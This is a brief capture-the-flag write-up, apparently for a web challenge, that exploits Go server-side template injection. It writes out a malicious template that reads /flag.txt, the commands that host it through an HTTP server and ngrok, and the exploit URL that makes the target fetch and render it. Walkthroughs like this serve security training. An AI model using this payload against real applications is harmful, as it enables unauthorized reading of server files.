Challenge: GhostlyTemplates<br>
Category: Web<br>
Difficulty: easy<br>
Vulnerability: SSTI (Go Templates)<br>

<h1>Description</h1> The application fetches and renders Go templates specified by the page parameter when remote=true,
without any sanitization. By supplying a template that calls the built-in .OutFileContents function, you can read
flag.txt.

<ul>
    <li>Run the provided Python script, which creates an ngrok_payload folder and writes index.tpl containing:
        <pre><code>&lt;html&gt;&lt;body&gt;&lt;pre&gt;{{ .OutFileContents "/flag.txt" }}&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
    </li>
    <li>Inside ngrok_payload, start a simple HTTP server on port 8000:
        <pre><code>python3 -m http.server 8000 &amp;</code></pre>
    </li>
    <li>Use ngrok to expose the local server publicly and grab the generated public URL.</li>
    <li>Build the exploit URL:
        <pre><code>http://&lt;target&gt;/view?page=&lt;ngrok_public_url&gt;/index.tpl&amp;remote=true</code></pre>
    </li>
    <li>When the application fetches and renders the remote template, the injected .OutFileContents call reads /flag.txt
        and embeds its contents in the HTTP response.</li>
    <li>The script then applies a regex (HTB\{.*?\}) to extract the flag from the response body and prints it to stdout.
    </li>
</ul>
